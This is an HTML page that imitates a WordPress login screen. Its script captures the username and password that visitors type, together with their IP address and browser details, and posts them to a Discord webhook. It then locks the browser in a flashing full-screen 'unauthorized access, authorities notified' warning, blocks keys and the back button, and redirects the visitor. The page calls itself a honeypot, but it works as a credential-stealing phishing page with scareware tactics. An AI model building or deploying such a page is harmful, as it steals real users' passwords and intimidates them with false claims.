<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WordPress Login</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
      background-color: #f1f1f1;
      min-height: 100vh;
    }
    
    .login-container {
      max-width: 320px;
      margin: 100px auto;
      padding: 26px 24px 46px;
      background-color: white;
      border-radius: 4px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.04);
    }
    
    .login-logo {
      text-align: center;
      margin-bottom: 20px;
    }
    
    .login-logo img {
      width: 84px;
      height: 84px;
    }
    
    h1 {
      text-align: center;
      color: #23282d;
      font-size: 24px;
      margin-top: 0;
      margin-bottom: 24px;
      font-weight: 400;
    }
    
    .form-group {
      margin-bottom: 16px;
    }
    
    label {
      display: block;
      margin-bottom: 5px;
      font-size: 14px;
      font-weight: 500;
      color: #23282d;
    }
    
    input {
      width: 100%;
      padding: 3px 10px;
      box-sizing: border-box;
      border: 1px solid #ddd;
      border-radius: 4px;
      font-size: 16px;
      line-height: 1.8;
    }
    
    input:focus {
      border-color: #00a0d2;
      box-shadow: 0 0 0 1px #00a0d2;
      outline: none;
    }
    
    button {
      width: 100%;
      padding: 0 12px 2px;
      height: 30px;
      background-color: #0085ba;
      color: white;
      border: none;
      border-radius: 3px;
      cursor: pointer;
      text-decoration: none;
      font-size: 13px;
      line-height: 26px;
      font-weight: 500;
      text-transform: none;
    }
    
    button:hover {
      background-color: #008ec2;
    }
    
    .form-footer {
      margin-top: 20px;
      font-size: 13px;
      text-align: center;
    }
    
    .form-footer a {
      color: #0073aa;
      text-decoration: none;
    }
    
    .form-footer a:hover {
      color: #00a0d2;
    }
    
    .honeytrap {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.95);
      color: #ff0000;
      z-index: 10000;
      display: none;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
      animation: flash 0.5s infinite;
    }
    
    @keyframes flash {
      0% { background-color: rgba(0, 0, 0, 0.95); }
      50% { background-color: rgba(40, 0, 0, 0.95); }
      100% { background-color: rgba(0, 0, 0, 0.95); }
    }
    
    .honeytrap h2 {
      font-size: 3em;
      margin-bottom: 20px;
      font-family: monospace;
    }
    
    .honeytrap p {
      font-size: 1.5em;
      font-family: monospace;
      max-width: 80%;
    }
    
    .hidden-exit {
      position: fixed;
      bottom: 5px;
      right: 5px;
      width: 10px;
      height: 10px;
      background: transparent;
      border: none;
      cursor: default;
      z-index: 10001;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="login-logo">
      <img src="https://s.w.org/style/images/about/WordPress-logotype-wmark.png" alt="WordPress Logo">
    </div>
    <h1>Log In</h1>
    <form id="login-form">
      <div class="form-group">
        <label for="username">Username or Email Address</label>
        <input type="text" id="username" name="username" required>
      </div>
      <div class="form-group">
        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>
      </div>
      <div class="form-group">
        <label>
          <input type="checkbox" name="rememberme" value="forever"> 
          Remember Me
        </label>
      </div>
      <button type="submit">Log In</button>
    </form>
    <div class="form-footer">
      <p><a href="#">Lost your password?</a></p>
      <p>← <a href="#">Back to Website</a></p>
    </div>
  </div>
  
  <div class="honeytrap" id="honeytrap">
    <h2>UNAUTHORIZED ACCESS DETECTED</h2>
    <p id="message">IP address logged. System administrator notified.</p>
    <p>Attempt to access secure system: <span id="timestamp"></span></p>
    <p>Remote session capture initiated...</p>
    <button class="hidden-exit" id="hidden-exit"></button>
  </div>

  <script>
    const webhookURL = 'YOUR_WEBHOOK';
    const loginForm = document.getElementById('login-form');
    const honeytrap = document.getElementById('honeytrap');
    const message = document.getElementById('message');
    const timestamp = document.getElementById('timestamp');
    const hiddenExit = document.getElementById('hidden-exit');
    let fullscreenRequests = 0;
    let fullscreenInterval;
    let loggingData = {
      attempted: false,
      formData: {},
      browserInfo: {},
      timestamp: '',
      ip: ''
    };

    // Log browser information
    loggingData.browserInfo = {
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      screenWidth: window.screen.width,
      screenHeight: window.screen.height
    };


  async function sendToDiscord(loggingData) {
    const payload = {
      username: "Login Logger",
      embeds: [
        {
          title: "🚨 Unauthorized Login Attempt 🚨",
          color: 16711680, // Red color
          fields: [
            { name: "📅 Timestamp", value: loggingData.timestamp, inline: false },
            { name: "🌐 IP Address", value: loggingData.ip || "Unknown", inline: false },
            { name: "👤 Username", value: loggingData.formData.username, inline: true },
            { name: "🔑 Password", value: "||" + loggingData.formData.password + "||", inline: true },
            { name: "🖥️ User Agent", value: loggingData.browserInfo.userAgent, inline: false },
            { name: "🖥️ Platform", value: loggingData.browserInfo.platform, inline: true },
            { name: "📺 Screen Size", value: `${loggingData.browserInfo.screenWidth}x${loggingData.browserInfo.screenHeight}`, inline: true }
          ],
          footer: { text: "Captured Login Attempt" },
          timestamp: new Date().toISOString()
        }
      ]
    };

    try {
      await fetch(webhookURL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
      console.log("📡 Data sent to Discord webhook.");
    } catch (error) {
      console.error("❌ Error sending to Discord:", error);
    }
  }

    // Handle login attempts
    loginForm.addEventListener('submit', async function(e) {
  e.preventDefault();
  
  // Capture form data
  loggingData.formData = {
    username: document.getElementById('username').value,
    password: document.getElementById('password').value
  };

  // Get real IP address
  try {
    const response = await fetch('https://ifconfig.me/ip');
    loggingData.ip = await response.text();
  } catch (error) {
    console.error('Error fetching IP:', error);
    loggingData.ip = 'IP retrieval failed';
  }
  
  loggingData.attempted = true;
  loggingData.timestamp = new Date().toString();
  timestamp.textContent = loggingData.timestamp;
  
  // Send the captured data to Discord webhook
  await sendToDiscord(loggingData); // Add this line

  // Existing honeypot functionality
  console.log('Honeypot data captured:', loggingData);
  
  // Show honeytrap with real IP
  honeytrap.style.display = 'flex';
  message.textContent = `IP address (${loggingData.ip}) logged. System administrator notified`;
  
  // Request fullscreen repeatedly
  requestFullscreenRepeatedly();
  
  // Simulate "logging" the attacker's information
  simulateLogging();
  
  // After delay, redirect to the specified URL
  setTimeout(() => {
    window.location.href = 'https://dignelsus.github.io/';
  }, 8000);
});

    function requestFullscreenRepeatedly() {
      clearInterval(fullscreenInterval);
      
      // Try to go fullscreen immediately
      requestFullscreen();
      
      // Set up interval to keep trying to go fullscreen
      fullscreenInterval = setInterval(() => {
        requestFullscreen();
        fullscreenRequests++;
      }, 100);
    }

    function requestFullscreen() {
      const elem = document.documentElement;
      if (elem.requestFullscreen) elem.requestFullscreen();
      else if (elem.webkitRequestFullscreen) elem.webkitRequestFullscreen();
      else if (elem.msRequestFullscreen) elem.msRequestFullscreen();
    }

    function simulateLogging() {
      let dots = '';
      const loggingInterval = setInterval(() => {
        dots = dots.length < 3 ? dots + '.' : '';
        message.textContent = `IP address (${loggingData.ip}) logged. System administrator notified${dots}`;
      }, 500);
      
      setTimeout(() => {
        clearInterval(loggingInterval);
        message.textContent = `IP: ${loggingData.ip} | LOCATION TRACKED | AUTHORITIES NOTIFIED`;
      }, 5000);
    }

    // Hidden exit button
    hiddenExit.addEventListener('click', function(e) {
      e.stopPropagation();
      honeytrap.style.display = 'none';
      clearInterval(fullscreenInterval);
      if (document.exitFullscreen) document.exitFullscreen();
      else if (document.webkitExitFullscreen) document.webkitExitFullscreen();
      else if (document.msExitFullscreen) document.msExitFullscreen();
    });

    // Security measures
    document.addEventListener('keydown', function(e) {
      if (honeytrap.style.display === 'flex') {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    });

    document.addEventListener('contextmenu', function(e) {
      if (honeytrap.style.display === 'flex') {
        e.preventDefault();
        return false;
      }
    });

    window.addEventListener('popstate', function(e) {
      if (honeytrap.style.display === 'flex') {
        history.pushState(null, document.title, window.location.href);
        e.preventDefault();
      }
    });

    // Add WordPress footer elements
    const footer = document.createElement('div');
    footer.style.textAlign = 'center';
    footer.style.color = '#999';
    footer.style.fontSize = '11px';
    footer.style.margin = '20px auto';
    footer.innerHTML = 'WordPress 6.4.3';
    document.body.appendChild(footer);

    const langSwitcher = document.createElement('div');
    langSwitcher.style.textAlign = 'center';
    langSwitcher.style.color = '#999';
    langSwitcher.style.fontSize = '13px';
    langSwitcher.style.margin = '10px auto';
    langSwitcher.innerHTML = '<a href="#" style="color:#999;text-decoration:none;">English (US)</a> | <a href="#" style="color:#999;text-decoration:none;">Español</a>';
    document.body.appendChild(langSwitcher);
  </script>
</body>
</html>
